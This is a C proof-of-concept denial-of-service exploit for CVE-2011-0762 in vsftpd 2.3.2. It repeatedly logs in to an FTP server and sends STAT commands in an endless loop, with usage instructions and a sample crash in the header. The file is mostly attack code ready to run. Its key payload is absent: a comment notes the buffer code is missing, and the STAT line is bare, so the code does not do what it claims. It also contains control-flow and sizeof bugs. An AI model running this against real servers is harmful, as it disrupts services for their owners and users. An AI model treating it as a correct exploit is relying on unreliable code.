#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

/*
This is code of
http://cxib.net/stuff/vspoc232.c

PoC CVE-2011-0762 ( vsftpd )
Remote Denial of Service

Affected: 2.3.2
Fix: 2.3.4

Author:
Maksymilian Arciemowicz

Use:
./vspoc232 127.0.0.1 21 user pass 1

or read
http://securityreason.com/achievement_securityalert/95
for more information

Example result:
cx@cx64:~$ telnet 172.5.0.129 21
Trying 172.5.0.129...
Connected to 172.5.0.129.
Escape character is '^]'.
500 OOPS: fork
Connection closed by foreign host.

*/

int skip=0;

int sendftp(int stream,char *what){
  if(-1==send(stream,what,strlen(what),0))
    printf("Can't send %s\n",what);
  else
    printf("send: %s\n",what);

  bzero(what,sizeof(what));
}

void readftp(int stream){
  char readline[4096];
  if(recv(stream,readline,4096,0)<1)
  if(!skip) exit(1); // end
  else
     printf("recv: %s\n",readline);
}

int sendstat(host,port,login,pass)
        char *host,*port,*login,*pass;
{
  char buffer[4097]; // send ftp command buffor
  int     sockfd,n,error;
  struct addrinfo hints;
  struct addrinfo *res, *res0;

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = PF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  error = getaddrinfo(host,port,&hints,&res0);

  if (error){
    errorcon:
    printf("Can`t connect\n.exit");
    exit(1);
  }

  if((sockfd=socket(res0->ai_family,res0->ai_socktype, res0->ai_protocol))<0) goto errorcon;
  if(-1==connect(sockfd,res0->ai_addr,res0->ai_addrlen)) goto errorcon;

  readftp(sockfd);
  snprintf(buffer,4096,"USER %s\nPASS %s\n\n",login,pass);
  sendftp(sockfd,buffer);
  readftp(sockfd);

  snprintf(buffer,4096,"STAT\n"); // Falta el codigo del buffer
  sendftp(sockfd,buffer);
  freeaddrinfo(res0);
}

int main(int argc,char *argv[])
{
  char *login,*pass,logindef[]="anonymous",passdef[]="cxib.net@127.0.0.1";

  if(argc<3){
    printf("\nUse: ./vspoc232 host port [username] [password] [option]\nhost and port are requied\nuse option = 1 to skip recv() fails\n\nexample:\n./vspoc232 127.0.0.1 21 user pass 1\n\n");
    exit(1);
  }

  char *host=argv[1];
  char *port=argv[2];

  if(4<=argc) login=argv[3];
  else login=logindef;

  if(5<=argc) pass=argv[4];
  else pass=passdef;

  if(6<=argc) skip=1;

  while(1){
    printf("----------------------------- next\n");
    sendstat(host,port,login,pass);
    //sleep(1); // some delay to be sure
  }
  return 0; // never happen
}
